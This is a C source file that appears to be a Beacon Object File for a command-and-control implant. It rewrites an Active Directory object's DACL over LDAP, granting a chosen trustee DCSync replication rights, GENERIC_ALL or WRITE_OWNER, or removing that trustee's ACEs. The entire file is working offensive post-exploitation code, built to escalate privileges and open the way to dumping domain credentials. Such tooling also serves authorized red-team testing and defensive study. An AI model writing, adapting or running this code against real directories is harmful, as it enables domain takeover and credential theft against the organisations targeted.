/*
 * bof-dacledit <target> <trustee> [dcsync|genericall|writeowner|remove]
 *
 * Edit an AD object's DACL over LDAP.  The nTSecurityDescriptor is read as a
 * binary self-relative security descriptor, one or more allow ACEs are
 * appended (or existing ACEs for the trustee are removed), and the result is
 * written back with the SD_FLAGS control limited to the DACL.
 *
 * Modes:
 *   dcsync      grant DS-Replication-Get-Changes / -All / -In-Filtered-Set
 *   genericall  grant GENERIC_ALL on the object
 *   writeowner  grant WRITE_OWNER on the object
 *   remove      delete every allow ACE for <trustee>
 *
 * <target> and <trustee> accept a distinguishedName, sAMAccountName or a
 * S-1-5-... SID (trustee only).  Requires WRITE_DAC on the target.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "cryptoh.h"
#include "ldaphelpers.h"
#include "adsd.h"

static const GUID guid_repl_changes =
    {0x1131f6aa, 0x9c07, 0x11d1, {0xf7, 0x9f, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2}};
static const GUID guid_repl_changes_all =
    {0x1131f6ad, 0x9c07, 0x11d1, {0xf7, 0x9f, 0x00, 0xc0, 0x4f, 0xc2, 0xdc, 0xd2}};
static const GUID guid_repl_filtered =
    {0x89e95b76, 0x444d, 0x4c62, {0x99, 0x1a, 0x0f, 0xac, 0xbe, 0xda, 0x64, 0x0c}};

#define BOF_ADS_RIGHT_DS_CONTROL_ACCESS 0x00000100U

void go(char *args, int alen)
{
    datap parser;
    char *target, *trustee, *mode = "dcsync";
    int tlen, ulen, mlen;
    char base[512], dn[768], guidstr[64];
    LDAP *ld = NULL;
    PSID sid = NULL;
    unsigned char *sd = NULL, *newsd = NULL;
    unsigned int sdlen = 0, newlen = 0;
    ULONG rc;
    int remove = 0;

    BeaconDataParse(&parser, args, alen);
    target  = BeaconDataExtract(&parser, &tlen);
    trustee = BeaconDataExtract(&parser, &ulen);
    mode    = BeaconDataExtract(&parser, &mlen);
    if (!target || !target[0] || !trustee || !trustee[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: dacledit <target> <trustee> [dcsync|genericall|writeowner|remove]\n");
        return;
    }
    if (!mode || !mode[0]) mode = "dcsync";
    remove = bof_stricmp(mode, "remove") == 0;

    ld = bof_ldap_open_ex(&rc);
    if (!ld) {
        bof_error_ldap("ldap_init/bind", rc,
                       "cannot reach or authenticate to a domain controller");
        return;
    }
    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
        bof_error_ldap("rootDSE defaultNamingContext", rc,
                       "cannot read the domain naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }
    if (bof_ldap_resolve_dn(ld, base, target, dn, sizeof(dn)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "target not found: %s\n", target);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    sid = bof_resolve_sid(trustee);
    if (!sid) {
        BeaconPrintf(CALLBACK_ERROR, "trustee not resolvable: %s\n", trustee);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (bof_ldap_read_bin(ld, dn, "nTSecurityDescriptor", &sd, &sdlen) != 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "cannot read nTSecurityDescriptor (need read-control?)\n");
        KERNEL32$LocalFree(sid);
        WLDAP32$ldap_unbind(ld);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] target: %s\n[*] SD: %u bytes\n",
                 dn, sdlen);

    if (remove) {
        newsd = bof_sd_remove_ace_for_sid(sd, sdlen, sid, &newlen);
    } else if (bof_stricmp(mode, "dcsync") == 0) {
        unsigned char *step = sd;
        unsigned int steplen = sdlen;
        int first = 1;

        newsd = bof_sd_append_ace(step, steplen, sid,
                                  BOF_ADS_RIGHT_DS_CONTROL_ACCESS,
                                  &guid_repl_changes, &newlen);
        if (newsd) {
            KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
            sd = newsd; sdlen = newlen;
            newsd = bof_sd_append_ace(sd, sdlen, sid,
                                      BOF_ADS_RIGHT_DS_CONTROL_ACCESS,
                                      &guid_repl_changes_all, &newlen);
            first = 0;
        }
        if (newsd) {
            KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
            sd = newsd; sdlen = newlen;
            newsd = bof_sd_append_ace(sd, sdlen, sid,
                                      BOF_ADS_RIGHT_DS_CONTROL_ACCESS,
                                      &guid_repl_filtered, &newlen);
        }
        (void)first;
    } else if (bof_stricmp(mode, "genericall") == 0) {
        newsd = bof_sd_append_ace(sd, sdlen, sid, 0x10000000U, NULL, &newlen);
    } else if (bof_stricmp(mode, "writeowner") == 0) {
        newsd = bof_sd_append_ace(sd, sdlen, sid, 0x00080000U, NULL, &newlen);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "unknown mode: %s\n", mode);
        KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
        KERNEL32$LocalFree(sid);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    if (!newsd || newlen < 20) {
        BeaconPrintf(CALLBACK_ERROR, "failed to build modified security descriptor\n");
        KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
        KERNEL32$LocalFree(sid);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    rc = bof_ldap_write_sd(ld, dn, newsd, newlen);
    if (rc == LDAP_SUCCESS) {
        bof_guid_to_str(&guid_repl_changes, guidstr, sizeof(guidstr));
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] DACL updated (%s, %u bytes) for trustee %s\n",
                     mode, newlen, trustee);
        if (bof_stricmp(mode, "dcsync") == 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                         "[*] granted control-access on replication GUIDs\n");
    } else {
        bof_error_ldap("ldap_modify", rc,
                       "the directory rejected the attribute update");
        bof_error_context("dn", dn);
        (void)guidstr;
    }

    KERNEL32$VirtualFree(newsd, 0, MEM_RELEASE);
    KERNEL32$VirtualFree(sd, 0, MEM_RELEASE);
    KERNEL32$LocalFree(sid);
    WLDAP32$ldap_unbind(ld);
}
